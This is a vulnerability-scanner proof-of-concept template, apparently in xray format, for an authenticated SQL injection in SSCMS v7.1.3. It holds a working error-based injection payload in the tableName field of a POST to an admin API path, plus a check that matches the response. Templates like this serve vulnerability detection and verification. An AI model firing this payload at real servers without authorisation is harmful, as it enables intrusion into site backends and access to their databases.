name: poc-yaml-sscms-layereditor-sqli
binding: 82f2955b-e6c7-4bf9-b994-d7311ffda1dc
manual: true
detail:
    author: secking
    links:
        - https://github.com/siteserver/cms/issues/3490
    vulnerability:
        id: CT-529814
        level: high
    description: sscms v7.1.3-sqli 后台需登录
transport: http
set:
    num: randomLowercase(5)
    md5num: md5(num)
    subst: substr(md5num, 4, 28)
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /api/admin/common/tableStyle/layerEditor
            headers:
                Content-Type: application/json
            body: |
                {"tableName":"siteserver_Site'and extractvalue(1,concat(0,md5('{{num}}')))-- ","attributeName":"weichat","relatedIdentities":"1,0","isRapid":true,"rapidValues":"","taxis":0,"displayName":"1","helpText":"","inputType":"Text","defaultValue":"","horizontal":true,"items":[{"label":"","value":"","selected":false}],"height":0,"relatedFieldId":null,"customizeCode":null}
        expression: response.status == 500 && response.body.bcontains(bytes(subst))
expression: r0()
